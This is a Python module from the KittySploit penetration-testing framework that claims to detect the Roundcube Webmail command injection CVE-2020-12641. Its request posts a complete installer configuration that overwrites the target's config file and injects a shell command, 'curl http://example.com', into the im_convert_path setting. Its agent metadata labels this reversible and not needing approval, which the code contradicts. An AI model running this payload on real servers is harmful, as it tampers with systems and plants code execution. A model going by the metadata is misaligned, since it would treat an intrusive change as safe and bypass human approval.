#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Roundcube Webmail before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Roundcube Webmail - Command Injection Detection',
        'description': 'Roundcube Webmail before 1.4.4 contains a command injection caused by shell metacharacters in configuration settings for im_convert_path or im_identify_path, letting attackers execute arbitrary code, exploit requires attacker to control configuration settings.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'roundcube', 'webmail', 'intrusive', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-12641',
            'https://github.com/mbadanoiu/CVE-2020-12641',
            'http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00083.html',
            'https://github.com/roundcube/roundcubemail/compare/1.4.3...1.4.4',
            'https://github.com/roundcube/roundcubemail/releases/tag/1.4.4',
        ],
        'cve': 'CVE-2020-12641',
    }

    def run(self):
        for path in ('/installer/index.php', '/roundcube/installer/index.php'):
            r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='_step=2&_product_name=Roundcube+Webmail&_support_url=&_skin_logo=&_temp_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Ftemp%2F&_des_key=aaCGmrf1vc2NIJ8whIA3aG9x&_enable_spellcheck=1&_spellcheck_engine=googie&_identities_level=0&_log_driver=file&_log_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Flogs%2F&_syslog_id=roundcube&_syslog_facility=8&_dbtype=mysql&_dbhost=localhost&_dbname=roundcube&_dbuser=roundcube&_dbpass=roundcube&_db_prefix=&_default_host%5B%5D=localhost&_default_port=143&_username_domain=&_auto_create_user=1&_sent_mbox=Sent&_trash_mbox=Trash&_drafts_mbox=Drafts&_junk_mbox=Junk&_smtp_server=localhost&_smtp_port=587&_smtp_user=%25u&_smtp_pass=%25p&_smtp_user_u=1&_smtp_log=1&_language=&_skin=elastic&_mail_pagesize=50&_addressbook_pagesize=50&_prefer_html=1&_htmleditor=0&_draft_autosave=300&_mdn_requests=0&_mime_param_folding=1&_plugins_autologon=autologon&_plugins_enigma=enigma&_plugins_zipdownload=zipdownload&submit=UPDATE+CONFIG&G&_im_convert_path=curl+http%3a//example.com')
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('Roundcube Webmail Installer', 'The config file was saved successfully',)
            if all(m in body for m in body_all):
                self.set_info(
                    severity='critical',
                    reason='Roundcube Webmail - Command Injection detected',
                    path=path,
                )
                return True
        return False

